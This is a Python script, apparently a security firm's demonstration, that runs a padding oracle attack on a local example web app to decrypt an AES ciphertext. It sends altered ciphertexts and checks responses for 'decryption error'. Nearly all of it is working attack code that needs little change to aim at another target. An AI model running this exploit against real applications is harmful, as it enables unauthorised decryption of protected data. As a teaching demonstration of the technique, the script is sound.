#!/usr/bin/env python 
"""Exploits a Padding Oracle vulnerability in an example web application.

Exploits a Padding Oracle vulnerability in an example web application (simple
scenario). It uses the python-paddingoracle library. Simple pattern matching is
performed to detect padding errors.
"""

from paddingoracle import BadPaddingException, PaddingOracle
import requests
import binascii
import logging

__author__ = "Georg Chalupar"
__email__ = "gchalupar@gdssecurity.com"
__copyright__ = "Copyright 2015, Gotham Digital Science Ltd"

class PadBuster(PaddingOracle):
    def __init__(self, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self.session = requests.Session()

    def oracle(self, data, **kwargs):
        """Sends data to web applicaiton and detects padding exception by
        checking for 'decryption error' in the responses"""
        # send HTTP request and receive response
        response = self.session.get('http://127.0.0.1:5000/echo',
            params={'cipher': binascii.hexlify(data)}, timeout=5, verify=False)
        
        # check for error message in response and throw BadPaddingException if it maches
        if 'decryption error' in response.text:
            raise BadPaddingException
        
        logging.debug('No padding exception raised on {}'.format(binascii.hexlify(data)))


if __name__ == '__main__':
    # enable debug logging and create padbuster instance
    logging.basicConfig(level=logging.DEBUG)
    padbuster = PadBuster()

    # value to decrypt
    cipher = '484b850123a04baf15df9be14e87369bc59ca16e1f3645ef53cc6a4d9d87308ed2382fb0a54f3a2954bfebe0a04dd4d6'
    cipherData = binascii.unhexlify(cipher)
    
    # launch padding oracle attack to decrypt value
    # block_size=16: set block size for AES (16 bytes = 128 bits)
    # iv=None: interpret first block as IV and do attempt not decrypt it
    decrypted = padbuster.decrypt(cipherData, block_size=16, iv=None)
    
    # print results
    print('\n\n\nDecrypted cipher value: %s => %r' % (cipher, decrypted))
